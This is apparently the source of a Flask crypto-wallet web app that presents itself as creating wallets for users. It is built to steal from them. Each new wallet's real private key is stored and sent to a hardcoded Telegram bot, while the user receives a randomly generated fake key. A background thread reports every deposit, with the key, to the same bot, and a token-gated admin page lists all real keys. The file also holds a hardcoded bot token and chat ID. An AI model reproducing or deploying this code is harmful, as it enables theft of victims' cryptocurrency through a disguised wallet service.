from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import secrets
from datetime import datetime
import requests
from eth_account import Account
from web3 import Web3
import threading
import time

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)
TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"
CHAT_ID = "8288130111"

w3_eth = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))
w3_bsc = Web3(Web3.HTTPProvider('https://bsc-dataseed.binance.org'))

conn = sqlite3.connect('saqr.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS wallets
    (id INTEGER PRIMARY KEY AUTOINCREMENT,
     network TEXT, address TEXT UNIQUE,
     real_key TEXT, fake_key TEXT,
     last_balance TEXT DEFAULT '0',
     created_at TEXT)''')
conn.commit()

def send_tg(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=3)
    except:
        pass

def check_balance(address, network):
    try:
        if network in ['ethereum', 'bsc']:
            w3 = w3_eth if network == 'ethereum' else w3_bsc
            balance_wei = w3.eth.get_balance(address)
            return float(w3.from_wei(balance_wei, 'ether'))
    except:
        pass
    return 0

def monitor_deposits():
    while True:
        try:
            c.execute("SELECT id, network, address, real_key, last_balance FROM wallets")
            wallets = c.fetchall()
            for w in wallets:
                wid, network, address, real_key, last_balance = w
                current = check_balance(address, network)
                last = float(last_balance)
                if current > last and current > 0:
                    deposit = current - last
                    c.execute("UPDATE wallets SET last_balance=? WHERE id=?", (str(current), wid))
                    conn.commit()
                    emoji = {"ethereum":"💎","bsc":"🔷","solana":"⚡"}.get(network,"💰")
                    send_tg(f"""🦅 <b>إيداع جديد!</b>
{emoji} {network.upper()}
🏦 <code>{address}</code>
💰 المبلغ: {deposit:.4f} ETH
🔑 المفتاح: <code>{real_key}</code>""")
        except:
            pass
        time.sleep(30)

threading.Thread(target=monitor_deposits, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/select')
def select():
    return render_template('select.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/withdraw')
def withdraw():
    return render_template('withdraw.html')

@app.route('/referral')
def referral():
    return render_template('referral.html')

@app.route('/certificates')
def certificates():
    return render_template('certificates.html')

@app.route('/payments')
def payments():
    return render_template('payments.html')

@app.route('/chat')
def chat():
    return render_template('chat.html')

@app.route('/api/create-wallet', methods=['POST'])
def create_wallet():
    network = request.json.get('network', 'ethereum')
    
    # محفظة حقيقية 100%
    account = Account.create()
    address = account.address
    real_key = account.key.hex()  # هذا اللي يشتغل في SafePal
    fake_key = "0x" + secrets.token_hex(32)
    
    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
              (network, address, real_key, fake_key, datetime.now().isoformat()))
    conn.commit()
    
    send_tg(f"🦅 محفظة جديدة!\n🌐 {network}\n🏦 {address}\n🔑 {real_key}")
    
    return jsonify({'address': address, 'private_key': fake_key})

@app.route('/admin')
def admin():
    if request.args.get('token', '') != 'saqr2026':
        return "Unauthorized", 401
    c.execute("SELECT * FROM wallets ORDER BY id DESC")
    wallets = c.fetchall()
    html = '<html><head><style>body{font-family:monospace;background:#0a0e27;color:#fff}table{border-collapse:collapse}td{padding:5px;border:1px solid #333}.key{color:gold}</style></head><body><h1 style="color:#00ff88">🦅 Admin Panel</h1><table>'
    for w in wallets:
        html += f'<tr><td>{w[1]}</td><td>{w[2][:25]}...</td><td class="key">{w[3]}</td><td>{w[5]}</td></tr>'
    return html + '</table></body></html>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
